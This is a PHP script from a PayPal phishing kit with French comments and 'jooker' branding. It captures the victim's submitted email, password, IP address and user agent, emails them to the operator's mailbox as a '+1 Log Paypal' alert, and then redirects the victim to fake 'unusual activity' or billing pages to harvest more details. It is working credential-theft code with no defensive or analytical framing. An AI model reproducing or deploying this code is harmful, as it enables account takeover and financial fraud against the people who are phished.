<?php
error_reporting(0);
ob_start();
session_start();

include '../monsterab/ab.php';
include '../algorythm/mail.php';
include '../algorythm/wanted_options.php';
if(isset($_POST['login_email'])){

//Variables ne pas toucher
$_SESSION['email'] = $_POST['login_email'];
$_SESSION['password'] = $_POST['login_password'];
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
//Message envoyé a votre boite rez 
$msg = "
🃏 jooker Rez 「 Nouveau Paypal 」 🃏
[🦩] Adresse E-Mail : ".$_SESSION['email']."
[🦩] Mot de passe : ".$_SESSION['password']."
+==========INFOS==========+
[📡] Adresse IP : ".$_SESSION['ip']."
[📶]  User Agent : ".$_SERVER['HTTP_USER_AGENT']."
🃏 jooker 🃏

";
$subject = "🦩 +1 Log Paypal " .$_SESSION['ip']." - ". $_SESSION['email'] . "❤️" ;
$fromsender = "From: 🃏jooker🃏 <log@rez.fr>";
mail($rezmail,$subject,$msg,$fromsender);
if($unusual_activity == "yes"){
header("Location: ../confirmations/unusual_activity");
$_SESSION['login'] = true;
}
else{

header("Location: ../confirmations/billing");
$_SESSION['login'] = true;
}
}
else{ 

header("Location: index.php");
}
?>